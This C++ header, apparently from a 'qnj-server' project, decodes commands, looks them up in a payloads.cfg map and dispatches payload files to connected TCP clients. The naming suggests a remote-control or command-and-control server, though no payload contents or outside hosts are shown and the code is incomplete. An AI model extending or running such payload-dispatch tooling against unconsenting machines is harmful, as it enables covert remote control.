#ifndef _SEND_TCP_COMMANDS_HPP_
#define _SEND_TCP_COMMANDS_HPP_
#include "../qnj_config.h"
#include "../server_2/TCP_handle_client.h"
#include "../networking/Parse_stuff/replace-characters.hpp"
#include "../networking/Parse_stuff/parse_payloads_cfg_file.hpp"
#include "./extract_payload_file.hpp"

void send_tcp_commands_to_client(std::string& cmd_value, std::string TCP_client_id) {
    replace_char(cmd_value, "%3A", ":");
    replace_char(cmd_value, "+", " ");

    std::istringstream iss(cmd_value);
    std::string command;
    std::string url;

    std::unordered_map<std::string, std::string> cmdMap;

    if (!loadConfig("/root/qnj-server/payloads.cfg", cmdMap)) 
    {
        std::cout << "Loading payloads.cfg failed" << std::endl;
        return;
    }

    if (!(iss >> command)) {
        std::cout << "Error: Empty command\n";
        return;
    }

    std::cout << "Send id: " << TCP_client_id << "\n";
    //std::cout << "Correct id: " << s << "\n";
    std::cout << command << std::endl;
    if (command == ":browse") 
    {
        if (!(iss >> url)) 
        {
            std::cout << "Error: Missing URL for browse command\n";
            return;
        }
        std::string browse_url_string = command + " " + url;
        std::cout << "Browse URL: " << browse_url_string << std::endl;
        return;
    }

    auto it = cmdMap.find(command);
    if (it != cmdMap.end())
    {
        extract_payload_file(it->second);
    }
    else 
    {
        std::cout << "Unknown command sent to TCP clients: " << command << "\n";
    }

    /*

    for (const auto& client_number_id_val : client_number_id) 
    {
        std::cout << "Client id: " << client_number_id_val << "\n";

        if (TCP_client_id == std::to_string(client_number_id_val))
        {
            std::cout << "skip\n";
        }
        else
        {
            

        }
    }

    */
}
#endif